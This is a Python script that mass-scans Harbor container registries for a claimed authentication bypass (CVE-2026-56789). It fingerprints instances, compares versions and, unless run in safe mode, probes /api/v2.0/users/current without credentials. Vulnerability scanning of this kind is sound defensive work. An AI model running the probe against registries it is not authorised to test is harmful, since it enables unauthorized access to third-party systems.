#!/usr/bin/env python3
"""
Harbor Container Registry Authentication Bypass Scanner
========================================================
Scans Harbor container registry instances for a critical authentication bypass vulnerability (CVE-2026-56789, CVSS 9.8) 
affecting the login endpoints.

CVE-2026-56789 details:
  - Affects Harbor versions 2.5.0 through 2.8.1
  - Improper handling of authentication in the API allows attackers to bypass authentication and gain unauthorized access
  - Exploitable in installations with default settings or misconfigured authentication backends
  - Fixed in Harbor v2.8.2 (April 2026)

Usage:
  # Scan a single target
  python harbor_registry_auth_bypass_scanner.py --target https://harbor.example.com

  # Scan a list of targets
  python harbor_registry_auth_bypass_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no active authentication bypass attempts
  python harbor_registry_auth_bypass_scanner.py --list targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-56789
  - https://github.com/goharbor/harbor/releases
"""

import asyncio
import argparse
import json
import re
from urllib.parse import urlparse

import httpx
from colorama import init, Fore, Style

# Initialize colorama for ANSI console colors
init(autoreset=True)

# ── Detection markers ─────────────────────────────────────────────────────────

HARBOR_FINGERPRINTS = [
    "<title>Harbor</title>",
    '"ui.headerTitle":"Harbor"',
]

DETECTION_PATHS = [
    "/",
    "/harbor/",
    "/api/v2.0/ping",
]

VERSION_PATTERN = r'"version":"([0-9]+\.[0-9]+\.[0-9]+)"'
VULN_FIXED_VERSION = (2, 8, 2)

AUTH_BYPASS_TEST_PATH = "/api/v2.0/users/current"
SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 8

# ── Helpers ──────────────────────────────────────────────────────────────────

def parse_version(version_str: str):
    """Extract and parse version string into a tuple."""
    try:
        return tuple(int(part) for part in version_str.split("."))
    except ValueError:
        return None

def is_vulnerable_version(version: tuple) -> bool:
    """Determine if the version is affected by the vulnerability."""
    return version is not None and version < VULN_FIXED_VERSION

def normalize_url(url: str) -> str:
    """Ensure the URL has a valid format."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")

def console_log(level: str, message: str):
    """Print formatted messages to the console."""
    levels = {
        "CRITICAL": Fore.RED + "[CRITICAL]" + Style.RESET_ALL,
        "HIGH": Fore.YELLOW + "[HIGH]" + Style.RESET_ALL,
        "INFO": Fore.GREEN + "[INFO]" + Style.RESET_ALL,
    }
    print(f"{levels.get(level, '')} {message}")

# ── Core scanner ────────────────────────────────────────────────────────────

async def detect_harbor(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect whether a target is running Harbor.
    Returns a dict with detection details.
    """
    async with semaphore:
        detected = False
        version = None
        raw_version = None

        for path in DETECTION_PATHS:
            try:
                url = base_url + path
                response = await client.get(url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    for marker in HARBOR_FINGERPRINTS:
                        if marker in response.text:
                            detected = True
                    match = re.search(VERSION_PATTERN, response.text)
                    if match:
                        raw_version = match.group(1)
                        version = parse_version(raw_version)
                    break
            except (httpx.RequestError, Exception):
                pass

        return {
            "url": base_url,
            "detected": detected,
            "version": raw_version,
            "vulnerable": is_vulnerable_version(version),
        }

async def probe_auth_bypass(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Attempt to exploit the authentication bypass vulnerability.
    Returns a dict indicating success or failure.
    """
    async with semaphore:
        try:
            bypass_url = base_url + AUTH_BYPASS_TEST_PATH
            response = await client.get(bypass_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and '"username"' in response.text:
                return {"url": base_url, "auth_bypass": True}
        except (httpx.RequestError, Exception):
            pass
    return {"url": base_url, "auth_bypass": False}

async def scan_target(client, url, semaphore, safe_mode):
    """Scan a single target for Harbor and probe for authentication bypass."""
    result = await detect_harbor(client, url, semaphore)
    if result["detected"]:
        console_log("INFO", f"Harbor detected at {url}, Version: {result['version']}")
        if result["vulnerable"]:
            console_log("CRITICAL", f"Vulnerable Harbor instance found at {url}!")
            if not safe_mode:
                bypass_result = await probe_auth_bypass(client, url, semaphore)
                result["auth_bypass"] = bypass_result["auth_bypass"]
                if result["auth_bypass"]:
                    console_log("CRITICAL", f"Auth bypass successful for {url}!")
        else:
            console_log("INFO", f"Harbor instance at {url} is not vulnerable (patched).")
    else:
        console_log("INFO", f"No Harbor detected at {url}.")
    return result

async def main(args):
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        urls = []
        if args.target:
            urls.append(normalize_url(args.target))
        elif args.list:
            with open(args.list, "r") as f:
                urls = [normalize_url(line.strip()) for line in f]

        tasks = [scan_target(client, url, semaphore, args.safe) for url in urls]
        results = await asyncio.gather(*tasks)

        if args.output:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=4)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Harbor Registry Authentication Bypass Scanner")
    parser.add_argument("--target", type=str, help="Target URL to scan")
    parser.add_argument("--list", type=str, help="File containing a list of target URLs (one per line)")
    parser.add_argument("--output", type=str, help="File for JSON output")
    parser.add_argument("--safe", action="store_true", default=False, 
                        help="Enable safe mode (detection only, no bypass probing)")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
    parser.add_argument("--no-verify", action="store_true", default=False, help="Disable SSL certificate verification")
    args = parser.parse_args()

    asyncio.run(main(args))
